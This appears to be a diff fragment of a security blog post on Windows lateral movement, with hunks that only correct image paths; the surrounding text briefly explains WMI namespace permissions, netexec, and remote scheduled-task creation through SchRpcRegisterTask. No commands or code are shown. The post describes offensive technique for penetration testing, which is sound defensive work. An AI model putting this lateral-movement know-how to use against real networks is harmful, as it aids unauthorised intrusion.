+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/wmi.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/wmi.png"  loading="lazy" alt="null"></a>
 <em>WMI namespace security configuration</em>
 
 The same can be achieved using netexec:
@@ -517,13 +517,13 @@ The Task Scheduler service is hosted by the following svchost process: `C:\Windo
 
 Starting with Windows 10 Version 1511, svchost.exe spawns taskhostw.exe, which then launches the executable defined by the scheduled task.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/taskhost.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/taskhost.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/taskhost.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/taskhost.png"  loading="lazy" alt="null"></a>
 <em>taskhostw.exe</em>
 
 
 Once connected, the client can invoke the `SchRpcRegisterTask` method to register a new scheduled task on the target system.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/taskscheduler.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/taskscheduler.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/taskscheduler.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/taskscheduler.png"  loading="lazy" alt="null"></a>
 <em>Task Scheduler remote object creation process</em>
 
 For every scheduled task created, an XML file named after the task is generated under `C:\Windows\System32\Tasks\`. This file contains the full description and configuration of the task.
@@ -558,7 +558,7 @@ That said, considering we've already discussed enabling lateral movement for non
 
 <h2 id="conclusion">Conclusion</h2>
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/chart2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/chart2.png" loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/chart2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/chart2.png" loading="lazy" alt="null"></a>
 <em>Summary chart</em>
 
 Although the configuration we discussed is not the default, Windows bases most of its access control on DACLs, and in a real engagement we cannot simply assume that default configurations have been left as is for at least two reasons:
